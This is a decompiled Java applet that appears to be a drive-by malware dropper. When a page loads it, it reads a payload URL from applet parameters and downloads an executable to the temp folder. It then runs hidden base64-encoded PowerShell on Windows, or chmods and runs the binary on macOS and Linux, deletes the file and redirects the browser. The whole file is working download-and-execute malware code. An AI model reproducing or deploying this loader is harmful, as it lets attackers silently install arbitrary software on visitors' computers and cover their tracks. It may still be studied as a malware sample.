import java.io.InputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.File;
import java.util.Random;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Java extends Applet
{
    private Object initialized;
    
    public Java() {
        this.initialized = null;
    }
    
    public Object isInitialized() {
        return this.initialized;
    }
    
    @Override
    public void init() {
        try {
            final String string = Long.toString(Math.abs(new Random().nextLong()), 36);
            String s = System.getProperty("java.io.tmpdir") + File.separator;
            new StringBuilder().append(System.getProperty("java.io.tmpdir")).append(File.separator).toString();
            final String lowerCase = System.getProperty("os.name").toLowerCase();
            final String property = System.getProperty("os.arch");
            String s2 = "";
            String parameter = "";
            String parameter2 = "";
            String parameter3 = "";
            int n = -1;
            if (lowerCase.indexOf("win") >= 0) {
                s2 = this.getParameter("WINDOWS");
                parameter = this.getParameter("STUFF");
                parameter2 = this.getParameter("64");
                parameter3 = this.getParameter("86");
                n = 0;
                s = s + string + ".exe";
            }
            else if (lowerCase.indexOf("mac") >= 0) {
                s2 = this.getParameter("OSX");
                n = 1;
                if (s.startsWith("/var/folders/")) {
                    s = "/tmp/";
                }
                s = s + string + ".bin";
            }
            else if (lowerCase.indexOf("nix") >= 0 || lowerCase.indexOf("nux") >= 0) {
                s2 = this.getParameter("LINUX");
                n = 2;
                s = s + string + ".bin";
            }
            if (s2.length() > 0 && s.length() > 0) {
                final InputStream openStream = new URL(s2).openStream();
                final BufferedInputStream bufferedInputStream = new BufferedInputStream(openStream);
                final BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(new File(s)));
                final byte[] array = new byte[2048];
                while (true) {
                    final int read = bufferedInputStream.read(array);
                    if (read <= 0) {
                        break;
                    }
                    bufferedOutputStream.write(array, 0, read);
                }
                bufferedOutputStream.flush();
                bufferedOutputStream.close();
                openStream.close();
            }
            final String parameter4 = this.getParameter("nextPage");
            if (parameter4 != null && parameter4.length() > 0) {
                this.getAppletContext().showDocument(new URL(parameter4));
            }
            if (n < 1) {
                if (new File("C:\\Windows\\System32\\WindowsPowershell\\v1.0").exists() && parameter2.length() > 3) {
                    if (property.contains("86") || property.contains("64")) {
                        if (parameter3.length() > 3) {
                            final Process start = new ProcessBuilder(new String[] { "cmd", "/c", "powershell", "-EncodedCommand", parameter3 }).start();
                            start.getOutputStream().close();
                            start.getInputStream().close();
                            start.getErrorStream().close();
                        }
                    }
                    else if (property.contains("i") && parameter2.length() > 3) {
                        final Process start2 = new ProcessBuilder(new String[] { "cmd", "/c", "powershell", "-EncodedCommand", parameter2 }).start();
                        start2.getOutputStream().close();
                        start2.getInputStream().close();
                        start2.getErrorStream().close();
                    }
                }
                if (parameter.length() < 3) {
                    Runtime.getRuntime().exec("cmd.exe /c " + s).waitFor();
                }
                if (parameter.length() > 3) {
                    Runtime.getRuntime().exec("cmd.exe /c \"" + s + " " + parameter + "\"").waitFor();
                }
                new File(s).delete();
            }
            else {
                Runtime.getRuntime().exec("/bin/chmod 755 " + s).waitFor();
                Runtime.getRuntime().exec(s).waitFor();
                new File(s).delete();
            }
            this.initialized = this;
        }
        catch (IOException ex) {
            ex.printStackTrace();
        }
        catch (Exception ex2) {
            ex2.printStackTrace();
        }
    }
}
